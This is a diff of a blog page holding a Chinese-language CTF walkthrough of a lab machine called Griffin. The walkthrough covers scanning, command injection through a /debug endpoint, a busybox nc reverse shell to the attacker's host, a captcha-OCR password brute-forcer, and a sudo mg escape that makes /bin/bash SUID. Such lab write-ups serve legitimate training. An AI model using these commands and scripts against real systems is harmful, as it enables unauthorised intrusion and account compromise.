@@ -7,894 +7,14 @@
     <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
     <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
-<meta name="description" content="# **一、信息收集**
-
-首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ sudo arp-scan -l
-Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
-Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-...
-192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
-...
-```
-
-确定目标IP地址为 `192.168.205.132`。
-
-接下来，使用`nmap`对目标主机进行全端口扫描，以识别开放的端口和服务。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nmap -p0-65535 192.168.205.132
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
-Nmap scan report for novice.com (192.168.205.132)
-Host is up (0.00038s latency).
-Not shown: 65534 closed tcp ports (reset)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-8080/tcp open  http-proxy
-MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-```
-
-扫描结果显示目标开放了`22`端口（SSH服务）和`8080`端口（HTTP代理服务）。
-
-# **二、Web渗透与漏洞利用**
-
-## **2.1 Web目录探测**
-
-访问`http://192.168.205.132:8080/`，页面显示欢迎信息。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/
-Yo, welcome to GriffinCorp, the coolest company in Quahog!
-Peter Griffin’s got your back with top-notch service.
-Don’t mess this up, or Lois is gonna be pissed!
-```
-
-使用`dirsearch`工具进行目录扫描，发现了`/info`和`/debug`两个路径。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ dirsearch -u http://192.168.205.132:8080
-...
-[09:28:14] 403 -   23B  - /debug
-[09:28:18] 200 -   49B  - /info
-...
-```
-
-## **2.2 远程命令执行（RCE）**
-
-访问`/info`路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/info
-System Info: Diagnostic token = BetaToken123
-...
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/info
-System Info: Diagnostic token = CyberCorpDebug123
-```
-
-访问`/debug`路径提示缺少`token`参数。尝试将从`/info`获取的令牌作为参数提供，页面提示缺少`run`命令。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
-Missing run command
-```
-
-这表明该端点可能存在命令执行漏洞。通过`run`参数传递`id`命令进行测试，成功执行并返回了结果。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=id'
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-```
-
-**注意**：由于令牌是随机的，需要先访问`/info`获取有效令牌，再立即用于`/debug`端点。
-
-## **2.3 获取反向Shell**
-
-在Kali上设置`netcat`监听8888端口。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nc -lvnp 8888
-```
-
-利用已发现的RCE漏洞，执行一个反向shell命令。这里使用`busybox nc`来建立连接。
-
-```bash
-http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
-```
-
-成功接收到反向shell，当前用户为`lois`。
-
-```bash
-listening on [any] 8888 ...
-connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
-id
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-```
-
-随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。
-
-```bash
-script /dev/null -c bash
-Ctrl+Z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=/bin/bash
-stty rows 36 columns 178
-```
-
-# **三、权限提升**
-
-## **3.1 本地枚举**
-
-获取`user.txt`中的第一个flag。
-
-```bash
-lois@Griffin:/home/lois$ cat user.txt
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-```
-
-使用`sudo -l`检查`lois`用户的sudo权限。
-
-```bash
-lois@Griffin:/home/lois$ sudo -l
-...
-User lois may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
-```
-
-`lois`可以免密使用`cat`命令读取`/root/startup.log`。检查网络连接情况，发现除了公网的`8080`和`22`端口外，还在本地`127.0.0.1`上监听了多个端口，包括一个`80`端口。
-
-```bash
-lois@Griffin:/opt$ ss -tnlp
-State                   Recv-Q                  Send-Q               Local Address:Port
-...
-LISTEN                  0                       5                          0.0.0.0:8080
-LISTEN                  0                       128                        127.0.0.1:80
-...
-```
-
-## **3.2 端口转发与Web二次渗透**
-
-由于`80`端口只在本地监听，我们无法直接访问。使用`socat`将本地的`80`端口转发到`8000`端口，以便从外部访问。
-
-```bash
-lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &
-```
-
-访问转发后的`http://192.168.205.132:8000/`，这是一个关于'Family Guy'的网站。再次使用`dirsearch`进行目录扫描，发现`robots.txt`文件。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8000/robots.txt
-User-agent: *
-Disallow: /family
-
-...
-
-rockyou: world's best dictionary, hands down!
-```
-
-`robots.txt`禁止访问`/family`路径，并暗示`rockyou`字典可能会派上用场。
-
-## **3.3 登录爆破 (lois -> meg)**
-
-访问`/family`路径是一个登录页面，包含用户名、密码和验证码。页面提示`brian`用户每5次尝试后会被锁定，需要重置。
-
-为此，编写了一个Python脚本，使用`ddddocr`库识别验证码，并结合字典对`brian`用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。
-
-```python
-import requests
-import ddddocr
-from concurrent.futures import ThreadPoolExecutor
-from threading import Lock
-import queue
-
-url = 'http://192.168.205.132:8000/family/'
-cap_url = 'http://192.168.205.132:8000/family/captcha.php'
-rst_url = 'http://192.168.205.132:8000/family/?reset=1'
-user = 'brian'
-dict_file = '5000q.txt'
-max_workers = 2
-
-ocr = ddddocr.DdddOcr()
-pw_q = queue.Queue()
-found = queue.Queue(maxsize=1)
-pr_lock = Lock()
-total = 0
-MAX_RETRY = 3   # 每个密码最多重试 3 次
-
-
-def worker():
-    global total
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
-        'Accept': 'text/html,*/*',
-        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',
-        'Connection': 'keep-alive',
-        'Referer': url,
-        'Upgrade-Insecure-Requests': '1'
-    })
-
-    tries = 0
-    while True:
-        if not found.empty():
-            return
-        try:
-            pw, retry = pw_q.get_nowait()
-            tries += 1
-
-            cap_img = s.get(cap_url, timeout=5).content
-            cap = ocr.classification(cap_img).strip()
-
-            if len(cap) != 4:
-                if retry < MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
-
-            r = s.post(url, data={'username': user, 'password': pw, 'captcha': cap}, timeout=5)
-
-            with pr_lock:
-                total += 1
-                n = total
-
-            res = r.text
-
-            # 账号被锁定
-            if 'ACCOUNT TEMPORARILY LOCKED!' in res:
-                with pr_lock:
-                    print(f'[{n:4d}] 🚫 {pw:<12} | 🔤 {cap} | 原因: 账号被锁定 → reset')
-                try:
-                    s.get(rst_url, timeout=5)
-                except requests.RequestException:
-                    pass
-                if retry < MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
-
-            # 破解成功
-            if 'Invalid security code!' not in res and 'Incorrect password!' not in res:
-                found.put((user, pw, cap, n))
-                with pr_lock:
-                    print(f'\n[+] 🎉 破解成功！🎉\n    用户名: {user}\n    密码: {pw}\n    验证码: {cap}\n    尝试: {n}')
-                return
-
-            # 失败原因输出
-            reason = '未知原因'
-            if 'Invalid security code!' in res:
-                reason = '验证码错误'
-            elif 'Incorrect password!' in res:
-                reason = '密码错误'
-
-            with pr_lock:
-                print(f'[{n:4d}] ❌ {pw:<12} | 🔤 {cap} | 原因: {reason}')
-
-        except queue.Empty:
-            break
-        except requests.RequestException:
-            if retry < MAX_RETRY:
-                pw_q.put((pw, retry + 1))
-        except Exception as e:
-            with pr_lock:
-                print(f'[!] 线程异常: {e}')
-
-
-if __name__ == '__main__':
-    try:
-        with open(dict_file, encoding='utf-8') as f:
-            for p in [x.strip() for x in f if x.strip()]:
-                pw_q.put((p, 0))   # (密码, 重试次数)
-    except:
-        print(f'[-] 字典未找到: {dict_file}')
-        exit(1)
-
-    print(f'[*] 开始爆破 | 用户: {user} | 字典: {dict_file} | 总数: {pw_q.qsize()} | 线程: {max_workers}\n')
-
-    with ThreadPoolExecutor(max_workers=max_workers) as ex:
-        list(ex.map(lambda _: worker(), range(max_workers)))
-
-    if found.empty():
-        print(f'\n[-] ❌ 爆破失败')
-```
-
-经过爆破，成功获得`brian`用户的密码。
-
-```
-[+] 🎉 破解成功！🎉
-    用户名: brian
-    密码: savannah
-    验证码: 8upj
-    尝试: 555
-```
-
-使用`brian:savannah`登录后，在Cookie中发现一个`auth_token`。经过分析，该token泄露了`meg`用户的凭据。
-
-```
-meg:lovelyfamily
-```
-
-使用`su`命令和该密码成功切换到`meg`用户。
-
-```bash
-lois@Griffin:/opt$ su meg
-Password: lovelyfamily
-meg@Griffin:~$ id
-uid=1001(meg) gid=1001(meg) groups=1001(meg)
-```
-
-## **3.4 Sudo提权 (meg -> peter)**
-
-检查`meg`用户的sudo权限。
-
-```bash
-meg@Griffin:~$ sudo -l
-...
-User meg may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
-```
-
-`meg`可以免密以root权限执行`/root/game.py`脚本。执行该脚本后，它会在`6666`端口上启动一个监听服务。
-
-```bash
-meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
-Server listening on port 6666...
-```
-
-该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。
-
-```python
-import socket
-import re
-import hashlib
-
-s = socket.socket()
-s.connect(('192.168.205.132', 6666))
-
-data = s.recv(4096).decode()
-print(data)
-
-match = re.search(r'\((\d+) \* (\d+)\) // (\d+)', data)
-a, b, c = map(int, match.groups())
-ans1 = str((a * b) // c)
-s.send((ans1 + '\n').encode())
-
-data = s.recv(4096).decode()
-print(data)
-s.send(b'flag{fakeflag}\n')
-
-data = s.recv(4096).decode()
-print(data)
-x = re.search(r'MD5\((\d+) \+ UNIX timestamp: (\d+)\)', data)
-param = x.group(1) + x.group(2)
-md5_hash = hashlib.md5(param.encode()).hexdigest()
-s.send((md5_hash + '\n').encode())
-
-print(s.recv(4096).decode())
-s.close()
-```
-
-成功通过所有挑战后，服务返回了一个密码。
-
-```
-Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
-```
-
-这个密码`Wow!VeryFuuuuuny!`实际上是`peter`用户的SSH密码。使用该密码成功登录`peter`账户。
-
-```bash
-┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ssh peter@192.168.205.132
-peter@192.168.205.132's password: Wow!VeryFuuuuuny!
-...
-peter@Griffin:~$ id
-uid=1003(peter) gid=1003(peter) groups=1003(peter)
-```
-
-## **3.5 Sudo提权 (peter -> root)**
-
-最后，检查`peter`用户的sudo权限。
-
-```bash
-peter@Griffin:~$ sudo -l
-...
-User peter may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/mg
-```
-
-`peter`可以免密以root权限运行文本编辑器`mg`。`mg`编辑器可以通过执行外部shell命令来进行提权。
-
-1.  创建一个脚本`/tmp/a`，内容为给`/bin/bash`添加SUID权限位，并赋予其执行权限。
-
-    ```bash
-    peter@Griffin:~$ echo 'chmod +s /bin/bash' > /tmp/a
-    peter@Griffin:~$ chmod +x /tmp/a
-    ```
-
-2.  以sudo权限运行`mg`。
-
-    ```bash
-    peter@Griffin:~$ sudo /usr/bin/mg
-    ```
-
-3.  在`mg`编辑器中，按`Alt-x`，输入`shell-command`并按回车。
-4.  在新的提示符下，输入`/tmp/a`并回车，执行我们的脚本。
-5.  按`Ctrl-x` `Ctrl-c`退出`mg`编辑器。
-
-此时，`/bin/bash`已被设置了SUID位。使用`-p`参数运行bash以保留有效用户ID（euid）。
-
-```bash
-peter@Griffin:~$ bash -p
-bash-5.0# id
-uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
-```
-
-成功获得root权限。读取最终的flag。
-
-```bash
-bash-5.0# cat /root/root.txt /home/lois/user.txt
-flag{root-be93b7d7f0a30d5159c0460874e6e015}
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-```sentence">
+<meta name="description" content="# ">
 <meta property="og:title" content="内部_Griffin">
-<meta property="og:description" content="# **一、信息收集**
-
-首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ sudo arp-scan -l
-Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
-Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-...
-192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
-...
-```
-
-确定目标IP地址为 `192.168.205.132`。
-
-接下来，使用`nmap`对目标主机进行全端口扫描，以识别开放的端口和服务。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nmap -p0-65535 192.168.205.132
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
-Nmap scan report for novice.com (192.168.205.132)
-Host is up (0.00038s latency).
-Not shown: 65534 closed tcp ports (reset)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-8080/tcp open  http-proxy
-MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-```
-
-扫描结果显示目标开放了`22`端口（SSH服务）和`8080`端口（HTTP代理服务）。
-
-# **二、Web渗透与漏洞利用**
-
-## **2.1 Web目录探测**
-
-访问`http://192.168.205.132:8080/`，页面显示欢迎信息。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/
-Yo, welcome to GriffinCorp, the coolest company in Quahog!
-Peter Griffin’s got your back with top-notch service.
-Don’t mess this up, or Lois is gonna be pissed!
-```
-
-使用`dirsearch`工具进行目录扫描，发现了`/info`和`/debug`两个路径。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ dirsearch -u http://192.168.205.132:8080
-...
-[09:28:14] 403 -   23B  - /debug
-[09:28:18] 200 -   49B  - /info
-...
-```
-
-## **2.2 远程命令执行（RCE）**
-
-访问`/info`路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/info
-System Info: Diagnostic token = BetaToken123
-...
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8080/info
-System Info: Diagnostic token = CyberCorpDebug123
-```
-
-访问`/debug`路径提示缺少`token`参数。尝试将从`/info`获取的令牌作为参数提供，页面提示缺少`run`命令。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
-Missing run command
-```
-
-这表明该端点可能存在命令执行漏洞。通过`run`参数传递`id`命令进行测试，成功执行并返回了结果。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=id'
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-```
-
-**注意**：由于令牌是随机的，需要先访问`/info`获取有效令牌，再立即用于`/debug`端点。
-
-## **2.3 获取反向Shell**
-
-在Kali上设置`netcat`监听8888端口。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nc -lvnp 8888
-```
-
-利用已发现的RCE漏洞，执行一个反向shell命令。这里使用`busybox nc`来建立连接。
-
-```bash
-http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
-```
-
-成功接收到反向shell，当前用户为`lois`。
-
-```bash
-listening on [any] 8888 ...
-connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
-id
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-```
-
-随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。
-
-```bash
-script /dev/null -c bash
-Ctrl+Z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=/bin/bash
-stty rows 36 columns 178
-```
-
-# **三、权限提升**
-
-## **3.1 本地枚举**
-
-获取`user.txt`中的第一个flag。
-
-```bash
-lois@Griffin:/home/lois$ cat user.txt
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-```
-
-使用`sudo -l`检查`lois`用户的sudo权限。
-
-```bash
-lois@Griffin:/home/lois$ sudo -l
-...
-User lois may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
-```
-
-`lois`可以免密使用`cat`命令读取`/root/startup.log`。检查网络连接情况，发现除了公网的`8080`和`22`端口外，还在本地`127.0.0.1`上监听了多个端口，包括一个`80`端口。
-
-```bash
-lois@Griffin:/opt$ ss -tnlp
-State                   Recv-Q                  Send-Q               Local Address:Port
-...
-LISTEN                  0                       5                          0.0.0.0:8080
-LISTEN                  0                       128                        127.0.0.1:80
-...
-```
-
-## **3.2 端口转发与Web二次渗透**
-
-由于`80`端口只在本地监听，我们无法直接访问。使用`socat`将本地的`80`端口转发到`8000`端口，以便从外部访问。
-
-```bash
-lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &
-```
-
-访问转发后的`http://192.168.205.132:8000/`，这是一个关于'Family Guy'的网站。再次使用`dirsearch`进行目录扫描，发现`robots.txt`文件。
-
-```bash
-┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl http://192.168.205.132:8000/robots.txt
-User-agent: *
-Disallow: /family
-
-...
-
-rockyou: world's best dictionary, hands down!
-```
-
-`robots.txt`禁止访问`/family`路径，并暗示`rockyou`字典可能会派上用场。
-
-## **3.3 登录爆破 (lois -> meg)**
-
-访问`/family`路径是一个登录页面，包含用户名、密码和验证码。页面提示`brian`用户每5次尝试后会被锁定，需要重置。
-
-为此，编写了一个Python脚本，使用`ddddocr`库识别验证码，并结合字典对`brian`用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。
-
-```python
-import requests
-import ddddocr
-from concurrent.futures import ThreadPoolExecutor
-from threading import Lock
-import queue
-
-url = 'http://192.168.205.132:8000/family/'
-cap_url = 'http://192.168.205.132:8000/family/captcha.php'
-rst_url = 'http://192.168.205.132:8000/family/?reset=1'
-user = 'brian'
-dict_file = '5000q.txt'
-max_workers = 2
-
-ocr = ddddocr.DdddOcr()
-pw_q = queue.Queue()
-found = queue.Queue(maxsize=1)
-pr_lock = Lock()
-total = 0
-MAX_RETRY = 3   # 每个密码最多重试 3 次
-
-
-def worker():
-    global total
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
-        'Accept': 'text/html,*/*',
-        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',
-        'Connection': 'keep-alive',
-        'Referer': url,
-        'Upgrade-Insecure-Requests': '1'
-    })
-
-    tries = 0
-    while True:
-        if not found.empty():
-            return
-        try:
-            pw, retry = pw_q.get_nowait()
-            tries += 1
-
-            cap_img = s.get(cap_url, timeout=5).content
-            cap = ocr.classification(cap_img).strip()
-
-            if len(cap) != 4:
-                if retry < MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
-
-            r = s.post(url, data={'username': user, 'password': pw, 'captcha': cap}, timeout=5)
-
-            with pr_lock:
-                total += 1
-                n = total
-
-            res = r.text
-
-            # 账号被锁定
-            if 'ACCOUNT TEMPORARILY LOCKED!' in res:
-                with pr_lock:
-                    print(f'[{n:4d}] 🚫 {pw:<12} | 🔤 {cap} | 原因: 账号被锁定 → reset')
-                try:
-                    s.get(rst_url, timeout=5)
-                except requests.RequestException:
-                    pass
-                if retry < MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
-
-            # 破解成功
-            if 'Invalid security code!' not in res and 'Incorrect password!' not in res:
-                found.put((user, pw, cap, n))
-                with pr_lock:
-                    print(f'\n[+] 🎉 破解成功！🎉\n    用户名: {user}\n    密码: {pw}\n    验证码: {cap}\n    尝试: {n}')
-                return
-
-            # 失败原因输出
-            reason = '未知原因'
-            if 'Invalid security code!' in res:
-                reason = '验证码错误'
-            elif 'Incorrect password!' in res:
-                reason = '密码错误'
-
-            with pr_lock:
-                print(f'[{n:4d}] ❌ {pw:<12} | 🔤 {cap} | 原因: {reason}')
-
-        except queue.Empty:
-            break
-        except requests.RequestException:
-            if retry < MAX_RETRY:
-                pw_q.put((pw, retry + 1))
-        except Exception as e:
-            with pr_lock:
-                print(f'[!] 线程异常: {e}')
-
-
-if __name__ == '__main__':
-    try:
-        with open(dict_file, encoding='utf-8') as f:
-            for p in [x.strip() for x in f if x.strip()]:
-                pw_q.put((p, 0))   # (密码, 重试次数)
-    except:
-        print(f'[-] 字典未找到: {dict_file}')
-        exit(1)
-
-    print(f'[*] 开始爆破 | 用户: {user} | 字典: {dict_file} | 总数: {pw_q.qsize()} | 线程: {max_workers}\n')
-
-    with ThreadPoolExecutor(max_workers=max_workers) as ex:
-        list(ex.map(lambda _: worker(), range(max_workers)))
-
-    if found.empty():
-        print(f'\n[-] ❌ 爆破失败')
-```
-
-经过爆破，成功获得`brian`用户的密码。
-
-```
-[+] 🎉 破解成功！🎉
-    用户名: brian
-    密码: savannah
-    验证码: 8upj
-    尝试: 555
-```
-
-使用`brian:savannah`登录后，在Cookie中发现一个`auth_token`。经过分析，该token泄露了`meg`用户的凭据。
-
-```
-meg:lovelyfamily
-```
-
-使用`su`命令和该密码成功切换到`meg`用户。
-
-```bash
-lois@Griffin:/opt$ su meg
-Password: lovelyfamily
-meg@Griffin:~$ id
-uid=1001(meg) gid=1001(meg) groups=1001(meg)
-```
-
-## **3.4 Sudo提权 (meg -> peter)**
-
-检查`meg`用户的sudo权限。
-
-```bash
-meg@Griffin:~$ sudo -l
-...
-User meg may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
-```
-
-`meg`可以免密以root权限执行`/root/game.py`脚本。执行该脚本后，它会在`6666`端口上启动一个监听服务。
-
-```bash
-meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
-Server listening on port 6666...
-```
-
-该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。
-
-```python
-import socket
-import re
-import hashlib
-
-s = socket.socket()
-s.connect(('192.168.205.132', 6666))
-
-data = s.recv(4096).decode()
-print(data)
-
-match = re.search(r'\((\d+) \* (\d+)\) // (\d+)', data)
-a, b, c = map(int, match.groups())
-ans1 = str((a * b) // c)
-s.send((ans1 + '\n').encode())
-
-data = s.recv(4096).decode()
-print(data)
-s.send(b'flag{fakeflag}\n')
-
-data = s.recv(4096).decode()
-print(data)
-x = re.search(r'MD5\((\d+) \+ UNIX timestamp: (\d+)\)', data)
-param = x.group(1) + x.group(2)
-md5_hash = hashlib.md5(param.encode()).hexdigest()
-s.send((md5_hash + '\n').encode())
-
-print(s.recv(4096).decode())
-s.close()
-```
-
-成功通过所有挑战后，服务返回了一个密码。
-
-```
-Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
-```
-
-这个密码`Wow!VeryFuuuuuny!`实际上是`peter`用户的SSH密码。使用该密码成功登录`peter`账户。
-
-```bash
-┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ssh peter@192.168.205.132
-peter@192.168.205.132's password: Wow!VeryFuuuuuny!
-...
-peter@Griffin:~$ id
-uid=1003(peter) gid=1003(peter) groups=1003(peter)
-```
-
-## **3.5 Sudo提权 (peter -> root)**
-
-最后，检查`peter`用户的sudo权限。
-
-```bash
-peter@Griffin:~$ sudo -l
-...
-User peter may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/mg
-```
-
-`peter`可以免密以root权限运行文本编辑器`mg`。`mg`编辑器可以通过执行外部shell命令来进行提权。
-
-1.  创建一个脚本`/tmp/a`，内容为给`/bin/bash`添加SUID权限位，并赋予其执行权限。
-
-    ```bash
-    peter@Griffin:~$ echo 'chmod +s /bin/bash' > /tmp/a
-    peter@Griffin:~$ chmod +x /tmp/a
-    ```
-
-2.  以sudo权限运行`mg`。
-
-    ```bash
-    peter@Griffin:~$ sudo /usr/bin/mg
-    ```
-
-3.  在`mg`编辑器中，按`Alt-x`，输入`shell-command`并按回车。
-4.  在新的提示符下，输入`/tmp/a`并回车，执行我们的脚本。
-5.  按`Ctrl-x` `Ctrl-c`退出`mg`编辑器。
-
-此时，`/bin/bash`已被设置了SUID位。使用`-p`参数运行bash以保留有效用户ID（euid）。
-
-```bash
-peter@Griffin:~$ bash -p
-bash-5.0# id
-uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
-```
-
-成功获得root权限。读取最终的flag。
-
-```bash
-bash-5.0# cat /root/root.txt /home/lois/user.txt
-flag{root-be93b7d7f0a30d5159c0460874e6e015}
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-```sentence">
+<meta property="og:description" content="# ">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
 <title>内部_Griffin</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -962,20 +82,19 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
 <p>首先，使用<code class="notranslate">arp-scan</code>工具对本地网络进行扫描，以发现目标主机的IP地址。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 ...
 192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
-...
-</code></pre>
+...</pre></div>
 <p>确定目标IP地址为 <code class="notranslate">192.168.205.132</code>。</p>
 <p>接下来，使用<code class="notranslate">nmap</code>对目标主机进行全端口扫描，以识别开放的端口和服务。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.132
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
-Nmap scan report for novice.com (192.168.205.132)
+Nmap scan report <span class="pl-k">for</span> novice.com (192.168.205.132)
 Host is up (0.00038s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -983,221 +102,205 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.10 seconds</pre></div>
 <p>扫描结果显示目标开放了<code class="notranslate">22</code>端口（SSH服务）和<code class="notranslate">8080</code>端口（HTTP代理服务）。</p>
 <h1><strong>二、Web渗透与漏洞利用</strong></h1>
 <h2><strong>2.1 Web目录探测</strong></h2>
 <p>访问<code class="notranslate">http://192.168.205.132:8080/</code>，页面显示欢迎信息。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.132:8080/
-Yo, welcome to GriffinCorp, the coolest company in Quahog!
+Yo, welcome to GriffinCorp, the coolest company <span class="pl-k">in</span> Quahog<span class="pl-k">!</span>
